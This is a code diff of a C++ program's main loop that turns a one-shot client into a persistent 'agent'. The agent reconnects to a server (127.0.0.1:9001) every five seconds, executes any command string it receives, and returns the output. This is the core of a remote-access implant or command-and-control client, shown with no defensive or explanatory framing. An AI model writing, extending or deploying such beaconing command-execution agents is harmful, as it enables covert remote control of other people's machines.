@@ -61,57 +61,71 @@ int main() {
     const char* server_ip = "127.0.0.1";
     int port = 9001;
 
-    int sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock < 0) return 1;
+    while (true) {
+        int sock = socket(AF_INET, SOCK_STREAM, 0);
+        if (sock < 0) {
+            sleep(5);
+            continue;
+        }
 
-    sockaddr_in server_addr{};
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(port);
-    inet_pton(AF_INET, server_ip, &server_addr.sin_addr);
+        sockaddr_in server_addr{};
+        server_addr.sin_family = AF_INET;
+        server_addr.sin_port = htons(port);
+        inet_pton(AF_INET, server_ip, &server_addr.sin_addr);
 
-    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
+        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
+            close(sock);
+            sleep(5);
+            continue;
+        }
+
+        bool session_active = true;
+        bool terminate_agent = false;
+
+        while (session_active){
+
+            PacketHeader req_header{};
+            
+            if (!read_exact(sock, reinterpret_cast<uint8_t*>(&req_header), sizeof(req_header))) {
+                break;
+            }
+
+            req_header.command_id = ntohl(req_header.command_id);
+            req_header.data_len = ntohl(req_header.data_len);
+
+            switch (req_header.command_id) {
+                case 1: { // Command execution
+                    std::vector<uint8_t> payload_buffer(req_header.data_len);
+                    if (read_exact(sock, payload_buffer.data(), req_header.data_len)) {
+                        std::string command(payload_buffer.begin(), payload_buffer.end());
+                        
+                        std::string result = execute_command(command);
+
+                        PacketHeader resp_header{};
+                        resp_header.command_id = htonl(1);
+                        resp_header.data_len = htonl(result.size());
+
+                        send(sock, &resp_header, sizeof(resp_header), 0);
+                        send(sock, result.c_str(), result.size(), 0);
+                    }
+                    break;
+                }
+                case 4: { // exit
+                    session_active = false;
+                    terminate_agent = true;
+                    break;
+                }
+                default: {
+                    break;
+                }
+            }
+        }
         close(sock);
-        return 1;
-    }
-
-    bool keep_running = true;
-    while (keep_running) {
-        PacketHeader req_header{};
-        
-        if (!read_exact(sock, reinterpret_cast<uint8_t*>(&req_header), sizeof(req_header))) {
+        if (terminate_agent) {
             break;
         }
 
-        req_header.command_id = ntohl(req_header.command_id);
-        req_header.data_len = ntohl(req_header.data_len);
-
-        switch (req_header.command_id) {
-            case 1: { // Command execution
-                std::vector<uint8_t> payload_buffer(req_header.data_len);
-                if (read_exact(sock, payload_buffer.data(), req_header.data_len)) {
-                    std::string command(payload_buffer.begin(), payload_buffer.end());
-                    
-                    std::string result = execute_command(command);
-
-                    PacketHeader resp_header{};
-                    resp_header.command_id = htonl(1);
-                    resp_header.data_len = htonl(result.size());
-
-                    send(sock, &resp_header, sizeof(resp_header), 0);
-                    send(sock, result.c_str(), result.size(), 0);
-                }
-                break;
-            }
-            case 4: { // exit
-                keep_running = false;
-                break;
-            }
-            default: {
-                break;
-            }
-        }
+        sleep(5);
     }
-
-    close(sock);
     return 0;
 }
